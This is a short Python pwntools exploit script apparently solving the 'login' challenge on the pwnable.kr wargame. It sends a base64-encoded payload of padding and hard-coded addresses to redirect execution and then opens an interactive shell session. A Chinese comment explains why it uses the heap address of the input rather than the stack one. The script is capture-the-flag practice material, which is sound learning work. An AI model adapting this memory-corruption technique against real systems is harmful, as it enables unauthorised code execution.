#coding=utf-8
from pwn import *

target = 0x8049284
input_addr = 0x811eb40

# 因為 stack 不是固定的，所以不能用這個，而要用上面的 input 在 heap 的位址
#input_addr = 0xffffd510

r = remote('pwnable.kr', 9003)
#r = process('./login')
payload = b64e('a' * 4 + p32(target) + p32(input_addr))
r.sendline(payload)
r.interactive()
